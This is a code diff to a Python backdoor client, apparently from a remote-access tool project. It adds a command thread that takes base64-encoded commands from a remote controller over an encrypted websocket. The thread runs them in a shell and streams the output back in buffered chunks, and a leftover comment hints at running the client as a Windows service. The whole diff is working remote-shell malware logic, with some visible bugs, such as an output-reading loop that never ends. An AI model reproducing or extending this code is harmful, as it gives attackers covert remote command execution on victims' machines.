@@ -20,6 +20,10 @@ from Crypto.Cipher import AES
 __author__ = 'nekocode'
 
 
+def get_char(msg):
+    return b64decode(msg['char'])
+
+
 class BackdoorClient(threading.Thread):
     cmd_queue = []
     consoles = []
@@ -56,9 +60,8 @@ class BackdoorClient(threading.Thread):
                                 _con.exit = True
                                 BackdoorClient.consoles.remove(_con)
 
-                        time.sleep(1)
-                        # consloe = Cmd(self, to_controler)
-                        # BackdoorClient.consoles.append(consloe)
+                        consloe = Cmd(self, to_controler)
+                        BackdoorClient.consoles.append(consloe)
 
                         self.send_json({'connected': None, 'to': to_controler})
 
@@ -66,6 +69,11 @@ class BackdoorClient(threading.Thread):
                         command = b64decode(msg['cmd'])
                         BackdoorClient.cmd_queue.append(command)
                         # todo
+
+                    elif 'char' in msg:
+                        char = get_char(msg)
+                        sys.stdin.write(char)       # todo
+                        sys.stdin.flush()
 
                 self.ws.close()
 
@@ -98,6 +106,92 @@ class BackdoorClient(threading.Thread):
         return plain
 
 
+class BufSender(threading.Thread):
+    BUF_SIZE = 10
+
+    def __init__(self, client, to_controler):
+        threading.Thread.__init__(self)
+
+        self.buf = ''
+        self.send_char = client.send_char
+        self.to_controler = to_controler
+        self.flush = False
+        self.time_count = 0
+
+        self.exit = False
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        while not self.exit:
+            if len(self.buf) > BufSender.BUF_SIZE or self.flush:
+                self.send_char(self.buf, self.to_controler)
+                self.buf = ''
+                self.flush = False
+            else:
+                time.sleep(0.01)
+                self.time_count += 1
+                if self.time_count >= 20:
+                    if len(self.buf) != 0:
+                        self.flush = True
+
+                    self.time_count = 0
+
+
+class Cmd(threading.Thread):
+    def __init__(self, client, to_controler):
+        threading.Thread.__init__(self)
+
+        self.send_data = client.send_data
+        self.send_char = client.send_char
+        self.send_end = client.send_end
+        self.to_controler = to_controler
+        self.buf_sender = BufSender(client, to_controler)
+
+        self.exit = False
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            while not self.exit:
+                while len(BackdoorClient.cmd_queue) == 0:
+                    time.sleep(0.1)
+
+                cmd_input = BackdoorClient.cmd_queue.pop(0)
+
+                if cmd_input == 'cmd':
+                    self.send_data('You are allready in cmd.', self.to_controler)
+                    self.send_end(self.to_controler)
+                    continue
+
+                proc = Popen(cmd_input, shell=True, stdout=PIPE, stderr=PIPE, stdin=sys.stdin)
+
+                char = proc.stdout.read(1)
+                self.buf_sender.buf += char
+                while char:
+                    char = proc.stdout.read(1)
+                    self.buf_sender.buf += char
+
+                char = proc.stderr.read(1)
+                self.buf_sender.buf += char
+                while char:
+                    data = proc.stderr.read(1)
+                    self.buf_sender.buf += char
+
+                proc.wait()
+
+                self.buf_sender.flush = True
+                while self.buf_sender.flush:
+                    time.sleep(0.1)
+
+                self.send_end(self.to_controler)
+
+        except Exception as e:
+            self.send_data('ERROR: ' + e.message, self.to_controler)
+            self.send_end(self.to_controler)
+
+
 class Download(threading.Thread):
     def __init__(self, url, filename):
         threading.Thread.__init__(self)
@@ -116,65 +210,6 @@ class Download(threading.Thread):
 
         except Exception as e:
             pass
-
-
-class Cmd(threading.Thread):
-    def __init__(self, client, to_controler):
-        threading.Thread.__init__(self)
-
-        self.send_data = client.send_data
-        self.send_char = client.send_char
-        self.send_end = client.send_end
-        self.decrypt = client.decrypt
-        self.encrypt = client.encrypt
-        self.ws = client.ws
-        self.to_controler = to_controler
-
-        self.exit = False
-        self.daemon = True
-        self.start()
-
-    def run(self):
-        try:
-            while not self.exit:
-                # todo: 会和主线程产生阻塞
-                msg = json.loads(self.decrypt(self.ws.recv()))
-                if 'cmd' in msg:
-                    cmd_input = b64decode(msg['cmd'])
-
-                    if cmd_input == 'cmd':
-                        print u'已经处于命令行模式'
-                        continue
-
-                    proc = Popen(cmd_input, shell=True, stdout=PIPE, stderr=PIPE, stdin=sys.stdin)
-
-                    char = proc.stdout.read(1)
-                    self.send_char(char, self.to_controler)
-                    sys.stdout.write(char)      # todo: delte
-                    sys.stdout.flush()
-                    while data:
-                        char = proc.stdout.read(1)
-                        self.send_char(char, self.to_controler)
-                        sys.stdout.write(char)
-                        sys.stdout.flush()
-
-                    char = proc.stderr.read(1)
-                    self.send_char(char, self.to_controler)
-                    sys.stdout.write(char)
-                    sys.stdout.flush()
-                    while data:
-                        data = proc.stderr.read(1)
-                        self.send_char(char, self.to_controler)
-                        sys.stdout.write(char)
-                        sys.stdout.flush()
-
-                    proc.wait()
-
-                    self.send_end(self.to_controler)
-
-        except Exception as e:
-            self.send_data('ERROR: ' + e.message, self.to_controler)
-            self.send_end(self.to_controler)
 
 
 # class BackendDaemonSrv(win32serviceutil.ServiceFramework):
